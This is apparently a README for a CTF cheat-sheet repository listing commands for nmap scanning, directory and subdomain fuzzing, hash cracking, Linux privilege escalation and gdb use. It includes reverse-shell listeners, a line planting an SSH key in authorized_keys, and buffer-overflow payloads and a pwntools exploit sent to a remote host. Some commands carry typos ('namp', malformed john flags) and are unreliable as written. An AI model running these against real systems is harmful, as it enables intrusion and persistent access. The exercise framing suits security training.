# ctf-cheatsheet
This repo comprises useful code bytes for solving common ctf tasks.
## initial tasks and enumeration
## linux privileges
##### exploits/privesc for common binaries
https://gtfobins.github.io/
##### listen for reverse shell connection
```bash
nc -lvp 1234
# or
socat file:`tty`,raw,echo=0 tcp-listen:12345
```
##### add ssh key to trusted (login)
```bash
echo "public key on kali" >> authorized_keys
```
##### create python webserver
```
python -m SimpleHTTPServer 4004
python3 -m http.server 4004
```
##### upgrade shell with python
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
##### get current user
```bash
whoami
```
##### change user to username
```bash
su - username
```
##### check, what can be executed with root
```bash
sudo -l
```
##### enumerate linux system (for example with www-data user)
```bash
https://github.com/rebootuser/LinEnum
```
## reverse hash
```bash
john hashes.txt --word-list=/usr/share/wordlists/somelist.txt --fformat-Raw-SHA256 --show
```
## linux network
##### change hosts file
```bash
sudo nano /etc/hosts
```

##### portscan
###### nmap, initial scan (scans ~1000 scans)
```bash
nmap -Pn -n -oN nmap_initial.txt 10.10.10.10
nmap -sV -sT -sC -o nmap_initial2.txt 10.10.10.10
```
###### nmap, full port scan
```bash
namp -A -p- -oN nmap_full.txt 10.10.10.10
```
###### nmap, target scan on port 20 and 80
```bash
nmap -Pn -n -p22,80 -sC -sV -oN nmap/targeted 10.10.10.10
```
##### scan for folders and files
###### gobuster, search for folders
```bash
gobuster dir -u domain.com -w /home/dir/wordlist.txt
```
###### gobuster, search for files (.txt / .php / etc)
```bash
gobuster dir -u domain.com -w /home/dir/wordlist.txt -x txt
```
##### scan for subdomains
1) add domain to hosts
2) run wfuzz (here: hide results with code 301)
```bash
wfuzz -c -w /home/path/subdomains.txt -u "http://domain.com" -H "Host: FUZZ.domain.com" -t 50 --hc 301
```
##### http GET/POST methods
###### curl GET with --data 
```bash
curl --get -d name=admin -d shoesize=12 http://example.com/
```
###### curl POST with --data 
```bash
curl -d name=admin -d shoesize=12 http://example.com/
```
###### wfuzz enumerate POST with --data
```bash
wfuzz -c -d "username=FUZZ&password=n00bsec" -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php
```

## buffer overflow
##### execute locally, string as text input
###### bash
```bash
run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\xbe\xad\xde"+ "\x0d\xd0\xde\xc0" )')
```
##### execute remotely, string as text input
###### bash
```bash
echo $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08")') | nc 123.123.123.123 32123
```
###### pwntools
```bash
from socket import socket
from pwn import *
ip = "sub.domain.com"
port = 1234
ret = 0x080491e2
no = 0x32432342
para_1 = 0xdedebebe
para_2 = 0xc0c00d0d
payload_len = 200 + 20
payload = "A" * payload_len
payload += p32(ret)
payload += p32(no)
payload += p32(para_1)
payload += p32(para_2)
r = remote(ip, port)
r.recvline()
r.sendline(payload)
r.interactive()
```

## linux binary debugger [gdb]
with peda plugin: https://github.com/longld/peda
###### useful commands
```bash
gdb ./file        # open binary in gdb
run               # r: run binary from start till to first breakpoint
break *0x080492c0 # set breakpoint to address
break main        # set breakpoint to beginning of main() function
info break        # show all breakpoints
-> del 1          # delete first breakpoint
continue          # c: continue execution till next breakpoint
next              # n: execute one line
x/300xb $esp      # show 300 bytes from stack (esp)
```

## python packages
##### build python package
```bash
python3 setup.py sdist bdist_wheel
```

##### upload with twine
```bash
python3 -m twine upload --repository-url http://pypi.domain.com:8080 /home/path/dist/* --verbose
```
-> enter username and password

### good writeupts:
https://noobsec.net/hackthebox/htb-falafel-writeup-w-o-metasploit/